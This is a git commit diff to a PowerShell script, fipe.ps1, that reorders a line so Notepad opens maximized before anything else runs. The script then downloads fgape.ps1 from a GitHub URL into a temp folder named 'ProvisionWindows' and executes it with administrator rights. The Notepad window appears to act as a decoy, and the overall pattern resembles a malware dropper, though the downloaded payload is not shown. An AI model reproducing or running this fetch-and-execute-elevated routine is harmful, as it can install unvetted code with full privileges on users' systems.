4ca8a6fec960d50f7c2be10717eab696cff035d8
FanAPIpipa <156794064+FanAPIpipa@users.noreply.github.com>
2024-02-05 12:59:21 +0300

    Update fipe.ps1

--- fipe.ps1
+++ fipe.ps1
@@ -1,8 +1,8 @@
+Start-Process -FilePath "notepad" -Wait -WindowStyle Maximized
 $tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
 $fgapeScriptUrl = "https://github.com/FanAPIpipa/pipa/raw/main/fgape.ps1"
 $fgapeScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "fgape.ps1"
 Invoke-WebRequest -Uri $fgapeScriptUrl -OutFile $fgapeScriptPath
-Start-Process -FilePath "notepad" -Wait -WindowStyle Maximized
 if (Test-Path $fgapeScriptPath) {
     Start-Process -FilePath "powershell" -ArgumentList "/c $fgapeScriptPath" -Verb RunAs
 } else {
